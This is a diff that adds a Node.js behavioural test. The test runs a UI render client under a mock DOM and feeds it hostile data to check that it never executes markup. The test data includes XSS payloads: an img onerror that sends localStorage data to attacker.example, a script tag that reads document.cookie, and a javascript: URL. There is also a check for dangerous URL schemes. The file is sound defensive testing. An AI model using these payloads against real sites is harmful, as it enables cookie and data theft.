@@ -1,0 +1,127 @@
+// Behavioural probe for the render client's core promise.
+//
+// The source-level test asserts innerHTML is never written. This one actually
+// RUNS the renderer, under a minimal DOM that records everything it is asked to
+// do, against a surface whose every bound value is hostile — markup, a script
+// tag, a javascript: URL, an event-handler string. It then asserts what the
+// client did: no innerHTML, no executable element, no on* attribute, and every
+// hostile string present on the page as literal characters.
+//
+// Run by tests/test_s14_ui.py through node; prints one JSON object.
+import fs from "node:fs";
+import path from "node:path";
+
+const root = path.resolve(process.argv[2] ?? ".");
+const page = path.join(root, "s13code", "ui", "client", process.argv[3] ?? "jobs.html");
+const html = fs.readFileSync(page, "utf8");
+// The page's own adversarial preset contains the characters "</script>", so
+// take the LAST closing tag rather than the first.
+const script = html.slice(html.indexOf("<script>") + 8, html.lastIndexOf("</script>"));
+
+let innerHTMLWrites = 0;
+let created = [];
+const registry = {};
+
+function mkEl(tag) {
+  const el = {
+    tagName: String(tag).toUpperCase(),
+    className: "", attrs: {}, children: [], dataset: {}, _text: "",
+    style: { cssText: "", setProperty() {}, alignItems: "", justifyContent: "", width: "", flex: "" },
+    classList: { toggle() {}, add() {}, remove() {} },
+    set innerHTML(v) { innerHTMLWrites++; },
+    get innerHTML() { return ""; },
+    set textContent(v) { this._text = String(v); this.children = []; },
+    get textContent() {
+      return this._text + this.children.map(c => (c.nodeType === 3 ? c.data : c.textContent)).join("");
+    },
+    append(...ns) { for (const n of ns) if (n != null) this.children.push(n); },
+    prepend(...ns) { this.children.unshift(...ns.filter(n => n != null)); },
+    appendChild(n) { this.children.push(n); return n; },
+    setAttribute(k, v) { this.attrs[k] = String(v); },
+    addEventListener() {},
+    querySelectorAll() { return []; },
+  };
+  created.push(el);
+  return el;
+}
+
+global.document = {
+  createElement: mkEl,
+  createElementNS: (_ns, tag) => mkEl(tag),
+  createTextNode: t => ({ nodeType: 3, data: String(t == null ? "" : t) }),
+  createDocumentFragment: () => mkEl("fragment"),
+  getElementById: id => (registry[id] ||= mkEl("div")),
+  querySelectorAll: () => [],
+  addEventListener() {},
+};
+global.window = {};
+global.performance = { now: () => 0 };
+// A browser always has a location, and a page is entitled to read its query
+// string at load. No query params here, so a page offering a replay path takes
+// its normal branch and the poisoned surface below is what actually gets drawn.
+global.location = { search: "", href: "http://127.0.0.1:8113/", pathname: "/" };
+global.fetch = async () => { throw new Error("the probe grants no network"); };
+
+const api = new Function(script + "\n;return {render};")();
+
+// Every bound value below is something an attacker would want executed.
+const POISON = {
+  markup: "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">",
+  script: "<script>alert(document.cookie)</script>",
+  jsurl: "javascript:steal()",
+  handler: "onerror=alert(1)",
+};
+
+const surface = {
+  root: "root",
+  components: [
+    { id: "root", type: "Column", children: ["h", "body", "note", "row", "board", "tbl", "tl", "bar", "spark", "prog", "btn"] },
+    { id: "h", type: "Text", variant: "heading", text: { $bind: "/markup" } },
+    { id: "body", type: "Text", variant: "body", text: { $bind: "/script" } },
+    { id: "note", type: "Notice", text: { $bind: "/jsurl" }, tone: "warn" },
+    { id: "row", type: "Row", children: ["tile"] },
+    { id: "tile", type: "StatTile", label: "stat", value: { $bind: "/handler" }, tone: "neutral" },
+    { id: "board", type: "Kanban", title: "Board", groups: { $bind: "/board" }, titleKey: "name", cardsKey: "cards", onCardPress: { action: "request_data" } },
+    { id: "tbl", type: "DataTable", columns: "Item,Note", rows: { $bind: "/rows" } },
+    { id: "tl", type: "Timeline", title: "Steps", events: { $bind: "/events" } },
+    { id: "bar", type: "BarChart", title: "Chart", data: { $bind: "/series" }, xKey: "label", yKey: "value" },
+    { id: "spark", type: "Sparkline", data: { $bind: "/values" }, tone: "good" },
+    { id: "prog", type: "ProgressBar", value: { $bind: "/done" }, max: 10, tone: "good" },
+    { id: "btn", type: "Button", label: { $bind: "/markup" }, onPress: { action: "request_data" } },
+  ],
+  dataModel: {
+    ...POISON,
+    board: [{ name: POISON.markup, cards: [POISON.script, POISON.jsurl] },
+            { name: "Empty", cards: [] }],
+    rows: [{ Item: POISON.markup, Note: POISON.script }],
+    events: [{ time: "1", label: POISON.markup }],
+    series: [{ label: POISON.script, value: 3 }],
+    values: [1, 2, 3],
+    done: 4,
+  },
+};
+
+api.render(surface);
+
+const mount = registry["mount"];
+const flatten = n => (n.nodeType === 3 ? n.data : (n.children || []).map(flatten).join("\0"));
+const painted = flatten(mount);
+
+const executable = created.filter(e => ["SCRIPT", "STYLE", "IFRAME", "OBJECT", "EMBED"].includes(e.tagName));
+const handlerAttrs = created.flatMap(e => Object.keys(e.attrs).filter(k => /^on/i.test(k)));
+const srcAttrs = created.flatMap(e => Object.entries(e.attrs)
+  .filter(([k]) => k === "src" || k === "href").map(([, v]) => v));
+
+console.log(JSON.stringify({
+  page: path.basename(page),
+  innerHTMLWrites,
+  executableElements: executable.map(e => e.tagName),
+  handlerAttributes: handlerAttrs,
+  unsafeUrlAttributes: srcAttrs.filter(v => /^\s*(javascript|data|vbscript):/i.test(v)),
+  // The hostile strings must be ON the page — as characters, not as elements.
+  markupIsLiteralText: painted.includes(POISON.markup),
+  scriptIsLiteralText: painted.includes(POISON.script),
+  jsUrlIsLiteralText: painted.includes(POISON.jsurl),
+  renderedSomething: painted.length > 0,
+  tappableCards: created.filter(e => e.className === "kb-card" && e.tagName === "BUTTON").length,
+}));
